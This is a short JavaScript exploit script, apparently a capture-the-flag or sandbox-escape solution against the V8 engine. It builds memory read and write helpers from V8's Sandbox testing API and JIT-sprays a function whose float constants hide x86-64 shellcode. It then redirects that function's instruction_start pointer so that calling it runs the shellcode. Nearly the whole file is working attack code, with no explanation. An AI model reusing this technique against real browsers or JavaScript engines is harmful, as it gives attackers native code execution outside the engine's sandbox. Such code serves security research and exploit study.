const RELEASE = true;

// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}

// get (compressed) address of `obj` in sandbox
function addrof(obj) {
    return Sandbox.getAddressOf(obj);
}

// read 4-byte from `addr` in sandbox
function read4(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    return memory_view.getUint32(0, true);
}

// read 8-byte from `addr` in sandbox
function read8(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 8));
    return memory_view.getBigUint64(0, true);
}

// write 4-byte `value` to `addr` in sandbox
function write4(addr, value) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    memory_view.setUint32(0, value, true);
}

function jit() {
    return [
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112871410787e-246, // 0xceb9050636cb866
        1.9711314215434657e-246, // 0xceb906163782fb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9616425752617766e-246, // 0xceb6e69622f0548
        1.9711832695973408e-246, // 0xceb9090e7894850
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711831018987653e-246, // 0xceb9090c0314890
        1.971112653196158e-246, // 0xceb9050303ab866
        1.9710920957760286e-246, // 0xceb903d59414cb8
        1.9710610293119303e-246, // 0xceb9020e0c14890
        1.9532382542574046e-246, // 0xceb505349440548
        1.971183239760578e-246, // 0xceb9090e0894850
        1.9711128050518315e-246, // 0xceb905053db3148
        1.971182900255075e-246, // 0xceb909090e28948
        1.9710902863710406e-246, // 0xceb903bb0c03148
        -6.828527034370483e-229 // 0x909090909090050f
    ];
}

// jit spraying
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // compile via turbofan

let jit_addr = addrof(jit);
console.log(`[+] jit_addr == ${hex(jit_addr)}`);

let code_addr = read4(jit_addr + 0x18) - 1;
console.log(`[+] code_addr == ${hex(code_addr)}`);

let instruction_start = read8(code_addr + 0x10);
console.log(`[+] instruction_start == ${hex(instruction_start)}`);
let shellcode_addr = RELEASE ? instruction_start + 0x59n : instruction_start + 0x72n;

// overwrite instruction_start with address of shellcode
write4(code_addr + 0x10, Number(shellcode_addr & 0xffffffffn));

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
